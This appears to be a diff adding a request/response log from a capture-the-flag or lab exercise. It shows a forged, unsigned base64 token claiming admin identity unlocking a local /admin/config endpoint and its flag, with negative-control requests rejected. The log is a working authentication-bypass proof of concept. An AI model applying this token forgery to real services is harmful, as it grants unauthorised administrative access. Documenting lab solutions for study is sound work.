@@ -1,0 +1,34 @@
+REQ  GET http://127.0.0.1:18081/admin/config?token=eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=
+RESP:
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.13.8
+Date: Wed, 23 Sep 2026 16:43:52 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 45
+
+{"flag": "FLAG{api_chain_ok}", "debug": true}
+--- 等价 header 方式
+REQ  GET http://127.0.0.1:18081/admin/config  + Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.13.8
+Date: Wed, 23 Sep 2026 16:43:52 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 45
+
+{"flag": "FLAG{api_chain_ok}", "debug": true}
+--- 负对照: uid=1 token
+HTTP/1.0 403 Forbidden
+Server: BaseHTTP/0.6 Python/3.13.8
+Date: Wed, 23 Sep 2026 16:43:52 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 23
+
+{"error": "admin only"}
+--- 负对照: 无 token
+HTTP/1.0 403 Forbidden
+Server: BaseHTTP/0.6 Python/3.13.8
+Date: Wed, 23 Sep 2026 16:43:52 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 23
+
+{"error": "admin only"}
